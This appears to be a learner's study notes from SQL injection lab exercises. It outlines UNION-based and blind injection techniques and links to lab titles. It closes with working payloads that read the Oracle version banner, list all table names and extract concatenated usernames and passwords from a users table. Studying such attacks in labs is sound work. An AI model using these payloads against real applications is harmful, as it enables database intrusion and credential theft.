UNION operator - SQL injection UNION attack
	rules - SQL injection UNION attack
	combining results into a single column - SQL injection UNION attack
gathering information - SQL injection UNION attack
	determining number of columns - SQL injection UNION attack
	determining column datatype - SQL injection UNION attack
	get column names - SQL injection - database types
	get table names - SQL injection - database types
database differences - SQL injection - database types
	determine database type - SQL injection - database types
conditional responses - Blind SQL injection


[[SQL injection attack, listing the database contents on non-Oracle databases]]
[[SQL injection attack, listing the database contents on Oracle]]
[[SQL injection attack, querying the database type and version on MySQL and Microsoft]]
[[SQL injection attack, querying the database type and version on Oracle]]
[[SQL injection with filter bypass via XML encoding]]
[[Blind SQL injection with conditional responses]]


- `union select null from dual` - assuming the right number of columns, this only works with oracle databases
- `Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--` - worked with two columns and oracle database, the first null was tested to be for strings, printed database version
- `Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--` - same situation, listed all table names
- `Gifts'+UNION+SELECT+USERNAME_SXESZI||'~'||PASSWORD_SSWMPS,NULL+FROM+USERS_XZCHWC--` - same situation, listed usernames and passwords
- PostgreSQL needs strings to have single quotes, not double quotes